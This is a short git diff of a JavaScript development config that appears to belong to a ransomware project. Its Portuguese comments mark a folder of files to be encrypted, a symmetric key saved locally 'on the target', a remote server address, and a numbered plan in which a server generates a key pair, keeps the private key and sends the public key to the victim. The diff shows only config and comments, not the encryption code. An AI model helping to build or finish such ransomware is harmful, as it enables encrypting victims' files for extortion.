@@ -3,7 +3,7 @@ const extensions = require("./extensions");
 
 const devConfig = {
     remoteServer:"http://localhost:3333",
-    startDirectory: "./files",
+    startDirectory: "./files",  // dir dos arqvs que seram crypt (apenas dev)
     sysInfoPath: path.join(__dirname, "..", "info.dat"), 
     extensions,
     symetricKeyPath: path.join(__dirname, "..", "secret.key"),    // salva localmnt no alvo p/ encrypt
@@ -19,7 +19,8 @@ module.exports = devConfig;
 2 - server gerar o par de chaves
 3 - server armazena a priv-key + passphrase
 4 - server manda pub-key p/ o alvo
-5 -     
+5 - pub-key é encryptada e salva localmnt
+6 - ...    
 */
 
 //-2
